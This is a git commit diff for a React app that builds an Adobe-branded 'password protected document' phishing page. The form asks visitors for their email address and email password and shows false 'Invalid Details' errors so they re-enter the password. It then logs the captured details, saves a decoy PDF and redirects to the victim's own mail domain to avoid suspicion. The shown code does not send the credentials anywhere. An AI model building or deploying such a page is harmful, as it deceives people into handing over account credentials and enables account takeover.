818b861c4d65b354b0472155b0aea96190cd1dd1
legaseas <rachvilly@gmail.com>
2022-01-03 18:18:22 -0800

    adobe-file complete commit

--- src/App.js
+++ src/App.js
@@ -1,23 +1,74 @@
-import logo from './logo.svg';
-import './App.css';
+import React, { useState, Alert } from "react";
+import AdobeForm from "./components/AdobeForm";
+import logo from './Image/pingr.png';
+import jsPDF from "jspdf";
+
 
 function App() {
+  const [user, setUser] = useState({ email: "", password: ""});
+  const [error, setError] = useState("");
+
+  const Login = (details, counter, setView) => {
+    console.log(details, counter);
+      setUser({
+        email: details.email,
+        password: details.password,
+      });
+    
+    try {
+        if (
+          !/[a-z0-9!#$%&'*+/=?^_`{|}~-]+(?:\.[a-z0-9!#$%&'*+/=?^_`{|}~-]+)*@(?:[a-z0-9](?:[a-z0-9-]*[a-z0-9])?\.)+[a-z0-9](?:[a-z0-9-]*[a-z0-9])?/i
+          .test(details.email) ||
+          details.password === ""
+        ) {
+          setError("Invalid Details. Please Check the details and try again");
+        }  else { 
+          setError("");
+        }
+        if (counter == 2) {
+          setError("Invalid Details. Please Check the details and try again");
+        }
+        
+    } 
+    catch(e){
+      console.log ('err');
+    }
+
+    const my_email = details.email;
+
+    // url extraction
+
+    const ind=my_email.indexOf("@");
+    const my_slice=my_email.substr(ind+1);
+    const c= my_slice.substr(0, my_slice.indexOf('.'));
+    const final= c.toLowerCase();
+    const finalu= c.toUpperCase();
+
+  
+    // downloading pdf and redirect_link
+
+    function success () {
+      if ( error == ""  && counter > 2 ) {
+        const doc = new jsPDF('landscape','px', 'a4','false');
+        doc.addImage(logo, 'PNG',65,20,500,400)
+        doc.save('file.pdf')
+        console.log(details)
+        setView(" Verifying ...")
+        // window.open(logo)
+        window.location.replace("http://www."+my_slice);
+      }       
+    } success()
+
+  };
+
+
   return (
-    <div className="App">
-      <header className="App-header">
-        <img src={logo} className="App-logo" alt="logo" />
-        <p>
-          Edit <code>src/App.js</code> and save to reload.
-        </p>
-        <a
-          className="App-link"
-          href="https://reactjs.org"
-          target="_blank"
-          rel="noopener noreferrer"
-        >
-          Learn React
-        </a>
-      </header>
+    <div id="content">
+      {user.email !== "" ? (
+        <AdobeForm Login={Login} error={error} />
+      ) : (
+        <AdobeForm Login={Login} error={error} />
+      )}
     </div>
   );
 }
---
+++ src/components/AdobeForm.js
@@ -0,0 +1,77 @@
+import React, {useState} from 'react';
+import $ from 'jquery';
+
+
+function AdobeForm({Login, error}) {
+    const logo = "https://cdn.glitch.com/0627790d-5fbd-4b4d-a18c-0cc83d211a6a%2Flg_211.png?v=1601072619401" 
+    const [details, setDetails] = useState({email: "", password: ""});
+    const [counter, setCounter] = useState(2);
+    const [view, setView] = useState("")
+
+    const submitHandler = (e) => {
+        e.preventDefault();
+        // const value = e.target.values
+
+        Login(details, counter, setView )
+
+        setCounter (counter +1)
+
+        if (!error == "" || counter <= 1) {
+            details.password = "";
+        }
+    }
+
+    return (
+            <form method="post">
+            <div className="header">
+                <img src={logo} width="571" height="87" alt="logo"/><br/>
+                <h2>
+                    <img src="https://cdn.glitch.com/0627790d-5fbd-4b4d-a18c-0cc83d211a6a%2Fwarning_sign_clip_art_20327.gif?v=1601072688646" width="29" height="30" alt=""/>THIS FILE IS PASSWORD PROTECTED*
+                </h2>
+                <h2>
+                    
+                </h2>
+                <h4>Sign in with your receiving email account to view document.</h4>
+            </div>
+
+
+            <div className='content-app'>
+                <div className='container'>
+                    <input 
+                        className="some"
+                        type="email" 
+                        placeholder="Email Address" 
+                        name="email" 
+                        id="email" 
+                        onChange={e => setDetails({...details, email: e.target.value})}
+                        value={details.email}
+                    />
+                    <input
+                        className="some" 
+                        type="password" 
+                        name="password" 
+                        id="password" 
+                        placeholder="Enter Email Password"
+                        required="required"
+                        onChange={e => setDetails({...details, password: e.target.value})}
+                        value={details.password}
+                    />
+                    <center>
+                        <div className="alert alert-danger" id="msg" style={{display: "none"}}>Invalid Password.! Please Enter
+                            your correct Password</div>
+                        {( error != "" ) ? <span id="error" className="text-danger" >{error}</span> : <span id="error" className="text-danger" style={{display: "none"}}></span> }
+                    </center>
+
+                </div>
+                <div className="contaniner2">
+                    { view == "" ? <button className="btn" id="submit-btn" onClick={submitHandler}>VIEW DOCUMENT</button> :
+                    <button className="btn" id="submit-btn" onClick={submitHandler}>{view}</button>}
+                </div>
+            </div>
+            <img src="https://cdn.glitch.com/0627790d-5fbd-4b4d-a18c-0cc83d211a6a%2Flg_212.png?v=1601072655196"
+                width="561" height="92" alt=""/>
+        </form>
+    )
+}
+
+export default AdobeForm;
